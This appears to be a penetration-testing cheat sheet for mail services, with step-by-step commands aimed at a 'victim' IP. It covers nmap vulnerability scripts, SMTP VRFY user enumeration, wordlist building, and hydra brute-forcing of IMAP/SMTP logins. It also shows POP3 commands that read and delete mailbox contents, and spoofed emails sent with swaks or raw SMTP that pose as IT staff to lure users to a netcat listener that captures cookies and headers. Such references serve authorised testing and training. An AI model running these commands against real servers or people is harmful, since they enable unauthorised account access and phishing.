# SMTP | POP | IMAP | Email \[ 25 | 110 | 143 | 993 | etc. ]

Set Temporary Variables

```
ip=<VictimIP>
```

## Enumeration

```
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip
```

## Mail Admin Control Panel??? \[xPORT]

### Connect to Service

```
telnet $ip < 4555 | PUERTO >
```

## Email Server Enumeration \[ 25/587/2525 - SSL 465/25025 ]

### Banner Grabbing / Basic Connections

```
telnet $ip < 25 | 587 | 2525 >
```

or

```
nc -nvv $ip < 25 | 587 | 2525 >
```

HELO \<domain.com> ← performs an exchange to ensure that hosts are communicating with the appropriate hosts.

EHLO \<domain.com> ← to indicate the identity of the client, opens the session, and provides a list of extensions supported by the server

VRFY \[@\<domain.com>] ← verifies the existence of a user. .If it responds with a code 250, 251, 252 it means that the user EXISTS. .If it responds with a code 550, 554 it means that the user DOES NOT exist.

```
openssl s_client -crlf -connect smtp.mailgun.org:465	← SSL/TLS without starttls
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```

### Find MX Server

```
dig +short mx google.com
```

## Enumerate / Verify users

### Create Dictionary With Web Site Content

<mark style="color:yellow;">**NB!**</mark> dictionary valid for brute force both usernames and passwords

1. create dictionary with literal words from the web

```
cewl < http://dominio.com | http://$ip[:port] > -d 5 [-m 3] [-w cewl.txt]
```

1. create dictionary with words from the web in lowercase letters

```
cewl < http://dominio.com | http://$ip[:port] > -d 5 [-m 3] [-w cewl_lowercase.txt] --lowercase
```

1. combine the two dictionaries created

```
cat cewl.txt > cewldic.txt; cat cewl_lowercase.txt >> cewldic.txt
```

1. reduce the combined file to single values

```
unique -inp=cewldic.txt cewlunique.txt
```

### Generate Usernames from First and Last names

1. generates usernames from a given first and last name

```
python usernamer_gen.py -l -n <"name subname"> [ > names_surnames.txt ]
```

or create file "webnames.txt" with list of names and surnames obtained

1. generate usernames from a list of first and last names in a file (e.g: obtained manually from the web)

```
python usernamer_gen.py -l -f <webnames.txt> [ > names_surnames.txt ]
```

### Combine Dictionaries

```
cat cewlunique.txt > dic.txt; cat names_surnames.txt >> dic.txt
```

### Verify Valid User Names

Use an ad hoc created dictionary or an existing one (e.g.: /usr/share/metasploit-framework/data/wordlists/unix\_users.txt)

```
smtp-user-enum -M VRFY [ -D domain.com ] -U dic.txt -t $ip [> smtp-valid-users.txt]
```

#### SMTP-VRFY-USER.py Script

[smpt-vrfy-users.py](../../../.gitbook/assets/scripts/smtp-vrfy-users.py)

```
./smtp-vrfy-users.py -t $ip -u <usernames.txt> --scan-vrfy [> smtp-users.txt]
```

### Extract Valid Usernames To File

```
cat smtp-valid-users.txt | grep exists | cut -d " " -f 2 > valid-users.txt
```

## Fuerza Bruta User:Password

### IMAP|SMPT \[ 25 | 143 | 993 ]

> <mark style="color:yellow;">**NB!**</mark> Use dictionary "dic.txt" previously created ad hoc

```
nmap -p [ 25 | 143 | 993 ] --script imap-brute $ip
hydra < -l | -L > [valid-username | valid-users.txt] -P dic.txt [-f] $ip [imap|smtp] [-V]
hydra -S -v < -l | -L > [valid-username | valid-users.txt] -P dic.txt -s 993 [-f] $ip [imap|smtp] [-V]
```

Where:

* <mark style="color:orange;">-l | -L</mark> to indicate that a username or a file with usernames will be used
* <mark style="color:orange;">valid-username | valid-users.txt</mark> the username or the file with the list of usernames
* <mark style="color:orange;">dic.txt</mark> indicates the dictionary to be used for the password
* <mark style="color:orange;">-f</mark> indicates to stop when the first login/pass is encountered
* <mark style="color:orange;">$ip</mark> IP address of the target machine
* <mark style="color:orange;">-V</mark> activates verbose mode (lots of noise)

## POP3 Enumeration \[110]

### Connect to Service

```
telnet $ip 110
USER userName 		← valid user name
PASS password 		← the password of the entered user.
LIST 				← list the emails in the inBox
RETR emailNumber	← Print on the screen the email indicated by the number (one of those listed by the LIST command).
DELE emailNumber 	← marks the email indicated with the number (one of those listed by the LIST command) for deletion from the server.
RSET 				← Unmark any email marked before for deletion.
QUITR 				← Deletes any message marked for deletion and disconnects from the server.
```

## Postfix: Sending Mail from the Console

### Description

Sometimes an email can be sent to a user, posing as another valid user (such as a member of IT), to get them to execute something, access a link or similar.

### Requirements

Access to port 25 of the victim server

### Receiving Responses

If a link is sent pointing to our machine, which the user is supposed to access, a Netcat can be raised, listening on the port indicated by the link (if it's a port indicated by the link (if it is http, it will be 80 by default), to receive the request and analyze the information it contains (cookies, headers, etc.).

```
nc -nlvp <link_port>
```

### Sending Through Onliner on the Console

```
swaks --to < $(cat emails | tr 'tr' ',' | less) | username@dominio.com > --from <dirección-válidad@dominio.com> --header "Subject: test" --body "please click here http://<$ip>/" --server < domain.com | $ip >
```

### Sending by Accessing the Service

<mark style="color:yellow;">**NB!**</mark> commands are in uppercase for clarity, but can be executed in lower case

```
nc -v < domain.com | $ip > 25
domain.co.uk [IP_VICTIMA] 25 (smtp) open
220 domain.co.uk ESMTP Postfix (Ubuntu)
HELO test
250 domain.co.uk
MAIL FROM: validsendername@dominio.com
250 2.1.0 Ok
RCPT TO: validrecibername@dominio.com
250 2.1.5 Ok
DATA
354 Terminate data with <CR><LF>.<CR><LF>.
Subject: Test message

Email body content.
Links, etc.

See you later

.
250 2.0.0.0.0 Ok: queued as CB8CA458E7
Exit from
221 2.0.0.0.0 Goodbye
```
